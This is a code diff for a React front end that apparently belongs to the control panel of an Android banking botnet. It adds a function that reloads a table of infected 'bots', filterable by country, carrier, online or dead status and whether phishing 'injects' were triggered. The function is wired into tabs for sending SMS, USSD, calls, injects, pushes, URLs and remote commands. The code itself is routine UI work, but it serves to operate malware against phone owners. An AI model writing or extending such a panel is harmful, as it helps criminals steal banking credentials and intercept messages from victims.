@@ -28,6 +28,9 @@ import Update from "./Tabs/Update";
 import Google from "./Tabs/Google";
 import Command from "./Tabs/Command";
 import Data from "./Tabs/Data";
+import { getBotTable } from './services';
+import { changeResponseToClient } from '../../common/Utility';
+
 
 const TabButton = ({ title, ICON, value }: { title: string, ICON: FC, value: string }) => {
 
@@ -53,8 +56,38 @@ const TabButton = ({ title, ICON, value }: { title: string, ICON: FC, value: str
   )
 }
 
+// eslint-disable-next-line import/no-anonymous-default-export
 export default () => {
   const { state, setState } = useContext(BotContext)
+
+  
+  const load = () => {
+
+    setState((state: BotStateType) => {
+      return {
+        ...state,
+        loading: true
+      }
+    })
+
+    getBotTable(state.table.page, state.table.perPage, state.search.botId, state.search.country, state.search.app, state.search.operator, state.search.online, state.search.offine, state.search.dead, state.search.hasInjects, state.search.hasNotInjects, state.search.triggeredInject).then((res: any) => {
+      setState((state: BotStateType) => {
+        let rows = res.rows.map((row: any) => changeResponseToClient(row))
+
+        return {
+          ...state,
+          loading: false,
+          table: {
+            ...state.table,
+            count: res.count,
+            rows: rows
+          }
+        }
+      })
+    })
+
+  }
+
 
   const onClose = (type: string) => {
     setState((state: BotStateType) => {
@@ -84,18 +117,18 @@ export default () => {
         <TabButton title="Commands" ICON={CodeOutlined} value='command' />
       </div>
 
-      <Modal centered visible={state.botTab.sms} footer={false} onCancel={() => { onClose('sms') }}><SMS /></Modal>
-      <Modal centered visible={state.botTab.ussd} footer={false} onCancel={() => { onClose('ussd') }}><USSD /></Modal>
-      <Modal centered visible={state.botTab.call} footer={false} onCancel={() => { onClose('call') }}><Call /></Modal>
-      <Modal centered visible={state.botTab.inject} footer={false} onCancel={() => { onClose('inject') }}><Inject /></Modal>
-      <Modal centered visible={state.botTab.run} footer={false} onCancel={() => { onClose('run') }}><Run /></Modal>
-      <Modal centered visible={state.botTab.push} footer={false} onCancel={() => { onClose('push') }}><Push /></Modal>
-      <Modal centered visible={state.botTab.url} footer={false} onCancel={() => { onClose('url') }}><URL /></Modal>
-      <Modal centered visible={state.botTab.data} footer={false} onCancel={() => { onClose('data') }}><Data /></Modal>
-      <Modal centered visible={state.botTab.delete} footer={false} onCancel={() => { onClose('delete') }}><Delete /></Modal>
-      <Modal centered visible={state.botTab.update} footer={false} onCancel={() => { onClose('update') }}><Update /></Modal>
-      <Modal centered visible={state.botTab.google} footer={false} onCancel={() => { onClose('google') }}><Google /></Modal>
-      <Modal centered visible={state.botTab.command} footer={false} onCancel={() => { onClose('command') }}><Command /></Modal>
+      <Modal centered visible={state.botTab.sms} footer={false} onCancel={() => { onClose('sms') }}><SMS load={load}/></Modal>
+      <Modal centered visible={state.botTab.ussd} footer={false} onCancel={() => { onClose('ussd') }}><USSD load={load} /></Modal>
+      <Modal centered visible={state.botTab.call} footer={false} onCancel={() => { onClose('call') }}><Call load={load} /></Modal>
+      <Modal centered visible={state.botTab.inject} footer={false} onCancel={() => { onClose('inject') }}><Inject load={load} /></Modal>
+      <Modal centered visible={state.botTab.run} footer={false} onCancel={() => { onClose('run') }}><Run load={load} /></Modal>
+      <Modal centered visible={state.botTab.push} footer={false} onCancel={() => { onClose('push') }}><Push load={load} /></Modal>
+      <Modal centered visible={state.botTab.url} footer={false} onCancel={() => { onClose('url') }}><URL load={load} /></Modal>
+      <Modal centered visible={state.botTab.data} footer={false} onCancel={() => { onClose('data') }}><Data load={load} /></Modal>
+      <Modal centered visible={state.botTab.delete} footer={false} onCancel={() => { onClose('delete') }}><Delete load={load} /></Modal>
+      <Modal centered visible={state.botTab.update} footer={false} onCancel={() => { onClose('update') }}><Update load={load} /></Modal>
+      <Modal centered visible={state.botTab.google} footer={false} onCancel={() => { onClose('google') }}><Google load={load} /></Modal>
+      <Modal centered visible={state.botTab.command} footer={false} onCancel={() => { onClose('command') }}><Command load={load} /></Modal>
     </div>
   )
 }
